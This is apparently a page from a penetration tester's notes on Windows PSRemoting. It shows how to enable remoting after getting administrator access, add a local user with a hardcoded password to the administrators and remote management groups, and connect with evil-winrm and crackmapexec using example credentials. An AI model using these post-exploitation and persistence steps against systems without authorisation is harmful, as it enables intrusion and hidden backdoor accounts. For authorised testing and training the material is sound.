# PSRemoting

## Enabling PSRemoting

After getting administrator access to a machine it is possible to enable PSRemoting:

```
Enable-PSRemoting
```

It might be usefull to add a new user or a user you already have to the local `Administrator` or `Remote Management Group`.

```
net user user Welcome01! /add
net localgroup administrators user /add
net localgroup "Remote Management Users" /add
```

## Accessing the machine

### PowerShell Enter-PSsession

```
Enter-PSSession ws01
```

![](<../../../.gitbook/assets/image (20).png>)

### Evil-WinRM

* [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

```
evil-winrm -i 10.0.0.128 -u john -p 'Welcome2022!'
```

![](<../../../.gitbook/assets/image (12).png>)

## Crackmapexec

* [https://github.com/byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

```
crackmapexec winrm 10.0.0.128 -u john -p 'Welcome2022!'
```

![](<../../../.gitbook/assets/image (42).png>)

{% hint style="info" %}
#### Observation

During testing I found out that crackmapexec is really slow over winrm if Windows Firewall is enabled on our fully up-to-date Windows 10 machine.
{% endhint %}

## References

{% embed url="https://github.com/Hackplayers/evil-winrm" %}

{% embed url="https://github.com/byt3bl33d3r/CrackMapExec" %}
